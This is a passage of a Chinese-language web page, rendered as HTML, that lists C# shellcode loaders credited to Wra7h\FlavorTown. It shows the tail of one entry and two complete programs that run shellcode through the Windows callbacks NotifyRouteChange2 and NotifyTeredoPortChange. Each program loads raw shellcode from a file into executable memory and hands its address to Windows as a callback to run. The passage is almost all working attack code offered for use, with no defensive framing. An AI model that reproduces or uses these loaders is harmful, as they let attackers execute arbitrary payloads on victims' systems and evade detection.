hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hProcess,<br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">int</span>&nbsp;dwSize,<br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flNewProtect,<br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;lpflOldProtect</span>)</span>;<br><span class="linenum hljs-number">58</span><br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"Iphlpapi.dll"</span>)</span>]<br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">NotifyIpInterfaceChange</span>(<span class="hljs-params"><br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;Family,<br><span class="linenum hljs-number">62</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;Callback,<br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;CallerContext,<br><span class="linenum hljs-number">64</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">bool</span>&nbsp;InitialNotification,<br><span class="linenum hljs-number">65</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">ref</span>&nbsp;IntPtr&nbsp;NotificationHandle</span>)</span>;<br><span class="linenum hljs-number">66</span><br><span class="linenum hljs-number">67</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">68</span>}<br></code></pre>
<h1 id="h9cnotifyroutechange2"><span>9.回调函数注入 (C#) 通过 NotifyRouteChange2</span></h1>
<pre><code class="hljs cs"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h\FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Compile:&nbsp;Visual&nbsp;Studio&nbsp;2022&nbsp;&amp;&nbsp;.NET&nbsp;Fx&nbsp;3.5+</span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-keyword">using</span>&nbsp;System;<br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">using</span>&nbsp;System.Diagnostics;<br><span class="linenum hljs-number"> 6</span><span class="hljs-keyword">using</span>&nbsp;System.Runtime.InteropServices;<br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-keyword">namespace</span>&nbsp;<span class="hljs-title">NotifyRouteChange2</span><br><span class="linenum hljs-number"> 9</span>{<br><span class="linenum hljs-number">10</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">internal</span>&nbsp;<span class="hljs-keyword">class</span>&nbsp;<span class="hljs-title">Program</span><br><span class="linenum hljs-number">11</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">12</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">void</span>&nbsp;<span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>[]&nbsp;args</span>)<br><span class="linenum hljs-number">13</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(args.Length&nbsp;&lt;&nbsp;<span class="hljs-number">1</span>)<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"\nNo&nbsp;shellcode&nbsp;specified."</span>);<br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"Example&nbsp;Usage:&nbsp;NotifyRouteChange2.exe&nbsp;C:\\Path\\To\\Raw\\Shellcode.bin\n"</span>);<br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.Environment.Exit(<span class="hljs-number">1</span>);<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">byte</span>[]&nbsp;payload&nbsp;=&nbsp;System.IO.File.ReadAllBytes(args[<span class="hljs-number">0</span>]);<br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr.Zero,<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(<span class="hljs-keyword">uint</span>)payload.Length,<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x1000</span>&nbsp;<span class="hljs-comment">/*COMMIT*/</span>,<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x40</span>&nbsp;<span class="hljs-comment">/*RWX*/</span>);<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Marshal.Copy(payload,&nbsp;<span class="hljs-number">0</span>,&nbsp;hAlloc,&nbsp;payload.Length);<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;oldProtect;<br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualProtectEx(Process.GetCurrentProcess().Handle,&nbsp;hAlloc,<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload.Length,&nbsp;<span class="hljs-number">0x20</span><span class="hljs-comment">/*RX*/</span>,&nbsp;<span class="hljs-keyword">out</span>&nbsp;oldProtect);<br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;AF_INET&nbsp;=&nbsp;<span class="hljs-number">0x2</span>;<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hNotification&nbsp;=&nbsp;IntPtr.Zero;<br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NotifyRouteChange2(AF_INET,&nbsp;hAlloc,&nbsp;IntPtr.Zero,&nbsp;<span class="hljs-literal">true</span>,&nbsp;<span class="hljs-keyword">ref</span>&nbsp;hNotification);<br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32"</span>)</span>]<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params"><br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwSize,<br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flAllocationType,<br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flProtect</span>)</span>;<br><span class="linenum hljs-number">46</span><br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32.dll"</span>)</span>]<br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">VirtualProtectEx</span>(<span class="hljs-params"><br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hProcess,<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">int</span>&nbsp;dwSize,<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flNewProtect,<br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;lpflOldProtect</span>)</span>;<br><span class="linenum hljs-number">54</span><br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"Iphlpapi.dll"</span>)</span>]<br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">NotifyRouteChange2</span>(<span class="hljs-params"><br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;AddressFamily,<br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;Callback,<br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;CallerContext,<br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">bool</span>&nbsp;InitialNotification,<br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">ref</span>&nbsp;IntPtr&nbsp;NotificationHandle</span>)</span>;<br><span class="linenum hljs-number">62</span><br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">64</span>}<br></code></pre>
<h1 id="h10cnotifyteredoportchange"><span>10.回调函数注入 (C#) 通过 NotifyTeredoPortChange</span></h1>
<pre><code class="hljs cs"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h\FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Compile:&nbsp;Visual&nbsp;Studio&nbsp;2022&nbsp;&amp;&nbsp;.NET&nbsp;Fx&nbsp;3.5+</span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-keyword">using</span>&nbsp;System;<br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">using</span>&nbsp;System.Diagnostics;<br><span class="linenum hljs-number"> 6</span><span class="hljs-keyword">using</span>&nbsp;System.Runtime.InteropServices;<br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-keyword">namespace</span>&nbsp;<span class="hljs-title">NotifyTeredoPortChange</span><br><span class="linenum hljs-number"> 9</span>{<br><span class="linenum hljs-number">10</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">internal</span>&nbsp;<span class="hljs-keyword">class</span>&nbsp;<span class="hljs-title">Program</span><br><span class="linenum hljs-number">11</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">12</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">void</span>&nbsp;<span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>[]&nbsp;args</span>)<br><span class="linenum hljs-number">13</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(args.Length&nbsp;&lt;&nbsp;<span class="hljs-number">1</span>)<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"\nNo&nbsp;shellcode&nbsp;specified."</span>);<br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"Example&nbsp;Usage:&nbsp;NotifyTeredoPortChange.exe&nbsp;C:\\Path\\To\\Raw\\Shellcode.bin\n"</span>);<br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.Environment.Exit(<span class="hljs-number">1</span>);<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">byte</span>[]&nbsp;payload&nbsp;=&nbsp;System.IO.File.ReadAllBytes(args[<span class="hljs-number">0</span>]);<br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr.Zero,<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(<span class="hljs-keyword">uint</span>)payload.Length,<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x1000</span>&nbsp;<span class="hljs-comment">/*COMMIT*/</span>,<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x40</span>&nbsp;<span class="hljs-comment">/*RWX*/</span>);<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Marshal.Copy(payload,&nbsp;<span class="hljs-number">0</span>,&nbsp;hAlloc,&nbsp;payload.Length);<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;oldProtect;<br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualProtectEx(Process.GetCurrentProcess().Handle,&nbsp;hAlloc,<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload.Length,&nbsp;<span class="hljs-number">0x20</span><span class="hljs-comment">/*RX*/</span>,&nbsp;<span class="hljs-keyword">out</span>&nbsp;oldProtect);<br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hNotification&nbsp;=&nbsp;IntPtr.Zero;<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NotifyTeredoPortChange(hAlloc,&nbsp;IntPtr.Zero,&nbsp;<span class="hljs-literal">true</span>,&nbsp;<span class="hljs-keyword">ref</span>&nbsp;hNotification);<br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32"</span>)</span>]<br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params"><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwSize,<br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flAllocationType,<br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flProtect</span>)</span>;<br><span class="linenum hljs-number">45</span><br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32.dll"</span>)</span>]<br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">VirtualProtectEx</span>(<span class="hljs-params"><br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hProcess,<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">int</span>&nbsp;dwSize,<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flNewProtect,<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;lpflOldProtect</span>)</span>;<br><span class="linenum hljs-number">53</span><br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"Iphlpapi.dll"</span>)</span>]<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">NotifyTeredoPortChange</span>(<span class="hljs-params"><br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;Callback,<br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;CallerContext,<br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">bool</span>&nbsp;InitialNotification,<br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">ref</span>&nbsp;IntPtr&nbsp;NotificationHandle</span>)</span>;<br><span class="linenum hljs-number">60</span><br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">62</span>}<br></code></pre>
